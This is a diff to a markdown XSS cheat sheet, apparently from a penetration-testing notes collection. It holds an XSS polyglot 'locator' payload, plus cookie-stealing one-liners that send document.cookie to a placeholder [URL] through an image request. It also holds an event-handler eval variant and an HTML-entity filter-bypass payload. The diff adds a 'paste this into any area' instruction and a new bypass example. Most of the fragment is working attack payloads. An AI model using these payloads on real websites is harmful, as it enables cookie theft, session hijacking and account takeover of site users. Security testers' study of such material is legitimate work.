@@ -3,12 +3,13 @@
 [Portswigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet) - XSS payload search (useful for making Burp Intruder payloads)
 
 # XSS Locator
+Paste this into any area you suspect is vulnerable to XSS
 ```javascript
 javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
 ```
 
 # Stealing Cookies
-Some quick payloads for stealing cookies.
+Some quick payloads for stealing cookies ``o(￣▽￣)ｄ``
 ## General One-Liner (Use this one first)
 ```javascript
 <script>var i=new Image;i.src="[URL]/?"+document.cookie;</script>
@@ -24,9 +25,10 @@ onmouseover=eval(var i=new Image;i.src="[URL]/?"+document.cookie;)
 
 # Filter Bypasses
 ## HTML Entities
+```javascript
+<IMG SRC=javascript:alert(&quot;1&quot;)>
 ```
-```
-
+For a complete list of HTML entities, go [Here](Web/Encodings/HTML.md)
 ## No parentheses
 ```
 ```
